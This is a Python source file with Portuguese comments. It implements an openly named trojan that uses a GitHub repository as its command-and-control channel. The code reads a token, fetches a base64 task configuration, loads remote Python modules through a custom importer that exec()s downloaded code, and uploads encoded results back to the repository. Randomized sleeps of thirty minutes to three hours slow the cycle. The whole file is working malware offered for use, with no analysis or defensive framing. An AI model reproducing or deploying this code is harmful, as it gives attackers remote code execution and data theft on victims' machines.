import base64
import github3
import importlib
import json
import random
import sys
import threading
import time
from datetime import datetime


# Função para conectar ao repositório do GitHub usando um token armazenado em um arquivo local
def github_connect():
    # Ler o token de 'secret.txt'
    with open('secret.txt') as f:
        token = f.read().strip()
    user = 'Adalberto069'  # Nome de usuário do GitHub
    sess = github3.login(token=token)  # Login no GitHub usando o token
    return sess.repository(user,
                           'ratatouille')  # Retorna o repositório específico


# Função para recuperar o conteúdo de um arquivo de um diretório específico no repositório do GitHub
def get_file_contents(dirname, module_name, repo):
    # Buscar o conteúdo do arquivo do diretório e nome do módulo especificado
    file = repo.file_contents(f'{dirname}/{module_name}')
    return file.content if file else None


# Classe representando o Trojan
class Trojan:

    def __init__(self, id):
        self.id = id  # Identificador para esta instância do Trojan
        self.config_file = f'{id}.json'  # Arquivo de configuração para o Trojan
        self.data_path = f'data/{id}/'  # Caminho para armazenar dados
        self.repo = github_connect()  # Conectar ao repositório do GitHub

    # Método para obter a configuração do repositório do GitHub
    def get_config(self):
        try:
            # Recuperar e decodificar o arquivo de configuração do diretório 'config'
            config_json = get_file_contents('config', self.config_file,
                                            self.repo)
            if config_json is None:
                raise FileNotFoundError(
                    f"Arquivo config/{self.config_file} não encontrado no repositório."
                )
            config = json.loads(base64.b64decode(config_json))
            for task in config:
                # Importar dinamicamente o módulo especificado na configuração
                if task['module'] not in sys.modules:
                    exec(f"import {task['module']}")
            return config  # Retornar a configuração como um dicionário
        except Exception as e:
            print(f"Erro ao obter configuração: {e}")
            return []

    # Método para executar um módulo específico da configuração
    def module_runner(self, module):
        try:
            # Executar o método 'run' do módulo e armazenar o resultado
            result = sys.modules[module].run()
            self.store_module_result(result)
        except Exception as e:
            print(f"Erro ao executar o módulo {module}: {e}")

    # Método para armazenar o resultado da execução do módulo no repositório do GitHub
    def store_module_result(self, data):
        try:
            message = datetime.now().isoformat(
            )  # Obter o tempo atual como uma string
            remote_path = f'data/{self.id}/{message}.data'  # Definir o caminho remoto no repositório
            # Codificar os dados em base64
            bindata = base64.b64encode(bytes(str(data), 'utf-8'))
            # Criar um novo arquivo no repositório com os dados codificados
            self.repo.create_file(remote_path, message,
                                  bindata.decode('utf-8'))
        except Exception as e:
            print(f"Erro ao armazenar resultado: {e}")

    # Método principal para executar o Trojan
    def run(self):
        while True:
            config = self.get_config()  # Obter a configuração do repositório
            for task in config:
                # Para cada tarefa na configuração, executar o módulo em uma nova thread
                thread = threading.Thread(target=self.module_runner,
                                          args=(task['module'], ))
                thread.start()
                # Tempo aleatório de espera entre 1 e 10 segundos antes de iniciar a próxima tarefa
                time.sleep(random.randint(1, 10))
            # Tempo aleatório de espera entre 30 minutos e 3 horas antes de repetir o processo
            time.sleep(random.randint(30 * 60, 3 * 60 * 60))


# Classe para importar módulos Python dinamicamente do repositório GitHub
class GitImporter:

    def __init__(self):
        self.current_module_code = ""  # Armazenar o código do módulo atual

    # Método para encontrar e carregar o módulo
    def find_spec(self, fullname, path, target=None):
        print(f"[*] Tentando recuperar {fullname}")
        self.repo = github_connect()  # Conectar ao repositório GitHub
        try:
            # Recuperar o código do módulo do diretório 'modules'
            new_library = get_file_contents('modules', f'{fullname}.py',
                                            self.repo)
            if new_library is not None:
                # Decodificar o código do módulo de base64
                self.current_module_code = base64.b64decode(new_library)
                return importlib.util.spec_from_loader(fullname, loader=self)
        except github3.exceptions.NotFoundError:
            print(f"[*] Módulo {fullname} não encontrado no repositório.")
            return None  # Retornar None se o módulo não for encontrado

    # Método para criar o módulo (não utilizado, portanto retorna None)
    def create_module(self, spec):
        return None

    # Método para executar o código do módulo
    def exec_module(self, module):
        # Executar o código do módulo no contexto do dicionário do módulo
        exec(self.current_module_code, module.__dict__)


# Seção principal do script
if __name__ == '__main__':
    # Adicionar o GitImporter ao caminho de busca de módulos do sistema
    sys.meta_path.append(GitImporter())
    # Criar uma instância do Trojan com um ID específico e executá-lo
    trojan = Trojan('abc')
    trojan.run()
